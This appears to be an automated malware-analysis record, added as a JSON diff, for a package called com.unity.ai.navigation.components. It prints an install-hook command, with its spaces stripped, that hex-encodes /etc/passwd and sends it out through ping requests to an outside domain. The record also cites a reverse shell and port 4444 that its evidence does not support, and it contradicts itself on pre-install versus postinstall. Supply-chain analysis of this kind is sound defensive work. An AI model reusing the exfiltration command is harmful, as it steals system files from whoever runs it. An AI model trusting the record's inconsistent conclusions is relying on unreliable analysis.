@@ -1,0 +1,68 @@
+{
+  "package_name": "com.unity.ai.navigation.components",
+  "version": "1.0.6",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 2,
+    "risk_vector": [
+      "install_hook",
+      "suspicious_behavior"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains a pre-install hook that executes at install time with the commands listed in the package metadata.",
+        "details": "The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The commands are: cat/etc/passwd|xxd-p-c16|whilereadexfil;doping-p$exfil-c1ns1.dhparadigm.xyz.",
+        "confidence": 0.72,
+        "evidence_commands": [
+          "cat/etc/passwd|xxd-p-c16|whilereadexfil;doping-p$exfil-c1ns1.dhparadigm.xyz"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      },
+      {
+        "category": "suspicious_behavior",
+        "summary": "The package contains no JavaScript files.",
+        "details": "The package contains no JavaScript files. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata.",
+        "confidence": 0.34,
+        "evidence_commands": [
+          "cat/etc/passwd|xxd-p-c16|whilereadexfil;doping-p$exfil-c1ns1.dhparadigm.xyz"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON object represents the analysis of the package. The \"behaviors\" field contains a list of malicious behaviors detected in the package. Each behavior is categorized into one of the following categories: credential_theft, sensitive_data_collection, crypto_hijacking, network_exfiltration, data_exfiltration, local_code_execution, system_reconnaissance, backdoor_installation, network_reconnaissance, remote_code_execution, dynamic_code_execution, dependency_injection, supply_chain_propagation, supply_chain_attack, repository_manipulation, privilege_escalation, persistence, sensitive_file_access, obfuscation, anti_debugging, anti_analysis, resource_abuse, typosquatting, install_hook, system_capability, suspicious_behavior, unknown. The \"risk_vector\" field contains a list of categories that represent the potential risk of the package."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.72
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not have a description or README file."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:14:25.918571"
+}
